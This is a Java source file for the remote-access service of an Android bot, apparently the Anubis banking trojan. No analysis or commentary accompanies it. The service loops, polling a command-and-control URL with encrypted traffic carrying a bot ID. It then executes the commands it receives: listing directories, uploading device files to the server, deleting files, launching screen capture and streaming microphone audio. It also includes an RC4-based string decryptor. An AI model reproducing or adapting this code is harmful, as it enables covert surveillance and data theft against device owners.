package anubis.bot.myapplication;

import android.app.IntentService;
import android.content.Intent;
import android.os.Environment;
import android.util.Base64;

import java.io.File;
import java.util.concurrent.TimeUnit;

import anubis.bot.myapplication.API.ClassRC4;
import anubis.bot.myapplication.API.RequestHttp;
import anubis.bot.myapplication.API.Screenshot.ActivityScreenshot;
import anubis.bot.myapplication.API.Screenshot.ServiceSendRequestImageVNC;
import anubis.bot.myapplication.API.Sound.ServiceStreamSound;


public class ServiceRAT extends IntentService {
    String botid="";
    UtilsClass utilsClass = new UtilsClass();
    Constants const_ = new Constants();
    RequestHttp  http = new RequestHttp();
    StoreStringClass storeStringClass = new StoreStringClass();
    public ServiceRAT() {
        super("ServiceRAT");
    }
    public String str_decrypt(String textDE_C, String key)
    {
        UtilsClass utilsClass = new UtilsClass();
        try
        {
            byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
            textDE_C = new String(data, "UTF-8");
            byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
            ClassRC4 rcd = new ClassRC4(key.getBytes());
            return  new String(rcd.decrypt(detext));
        }catch (Exception ex){ }
        return "";
    }
    @Override
    protected void onHandleIntent(Intent intent) {
        botid = utilsClass.ID_B(this).replace(" ","");
        File file;
        while(true) {
            try {TimeUnit.MILLISECONDS.sleep(1000);} catch (InterruptedException e) {e.printStackTrace();}
            String url = utilsClass.SetRead(this, "websocket");
            if (url.equals("")) {
                break;
            }

           String responce = http.go_post_notag(url+const_.gateRAT,"tuk_tuk="+ utilsClass.trafEnCr(botid+"|:| "));
           responce = utilsClass.trafDeCr(responce);
           utilsClass.Log("RATresponce",""+responce);

           if(responce!="**"){
               utilsClass.Log("RAT_command", "" + responce);
               if(responce.contains("opendir:")){

                   String opendir = responce.replace("opendir:","");
                   opendir = opendir.split("!!!!")[0];

                   if(opendir.contains("getExternalStorageDirectory"))opendir = Environment.getExternalStorageDirectory().getAbsolutePath();

                   String getFileFolder = utilsClass.listFilesWithSubFolders(new File(opendir));//"####path1|path2|path3|####file1.txt|file2.txt|file3.txt|####";

                   http.go_post_notag(url + const_.gateRAT,"tuk_tuk="+ utilsClass.trafEnCr(botid+"|:|getPath!!!!" +opendir + "!@@!" + getFileFolder));


                   utilsClass.Log("path","getPath!!!!"+opendir);
                   utilsClass.Log("sss","getFileFolder"+getFileFolder);
               }else if(responce.contains("downloadfile:")){
                   String open = responce.replace("downloadfile:","");
                   open = open.split("!!!!")[0];
                   utilsClass.Log("file",open);
                   try {
                       utilsClass.inputFile(this, open,"","getfiles[]");
                       http.go_post_notag(url+const_.gateRAT,"tuk_tuk="+ utilsClass.trafEnCr(botid+"|:|!!!refreshfilefolder!!!"));
                   }catch (Exception ex){
                       utilsClass.Log("sss","error sender");
                   }
               }else if(responce.contains("deletefilefolder:")){
                   try {
                       String deletefolder = responce.replace("deletefilefolder:", "");
                       file = new File(deletefolder.split("!!!!")[0]);
                       file.delete();
                       String getFileFolder = utilsClass.listFilesWithSubFolders(new File(file.getParent()));//"####path1|path2|path3|####file1.txt|file2.txt|file3.txt|####";
                       http.go_post_notag(url + const_.gateRAT,"tuk_tuk="+ utilsClass.trafEnCr(botid+"|:|getPath!!!!" +file.getParent() + "!@@!" + getFileFolder));
                   }catch (Exception ex){}
               }else if(responce.contains("startscreenVNC")){
                   if(!utilsClass.isMyServiceRunning(this,ServiceSendRequestImageVNC.class)) {
                       utilsClass.SetWrite(this,"vnc","start");

                       Intent dialogIntent = new Intent(this, ActivityScreenshot.class);
                       dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                       startActivity(dialogIntent);
                       //dialogIntent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                       //dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
                   }
               }else if(responce.contains("stopscreenVNC")){
                   utilsClass.SetWrite(this,"vnc","stop");
               }else if(responce.contains("startsound")){
                   if(utilsClass.hasPermission(this, storeStringClass.RECORD_AUDIO[0])){
                       utilsClass.SetWrite(this,"sound","start");
                       startService(new Intent(this, ServiceStreamSound.class)
                               .putExtra("str","no"));
                   }
               }else if(responce.contains("startforegroundsound")){
                   if(utilsClass.hasPermission(this, storeStringClass.RECORD_AUDIO[0])){
                       utilsClass.SetWrite(this,"sound","start foreground");
                       startService(new Intent(this, ServiceStreamSound.class)
                       .putExtra("str","foreground"));
                   }
               }else if(responce.contains("stopsound")){
                   utilsClass.SetWrite(this,"sound","stop");;
               }else if(responce.contains("**noconnection**")){
                   utilsClass.SetWrite(this,"websocket","");
                   utilsClass.SetWrite(this,"vnc","stop");
                   utilsClass.SetWrite(this,"sound","stop");
                   stopService(intent);
               }
           }


        }
    }
}
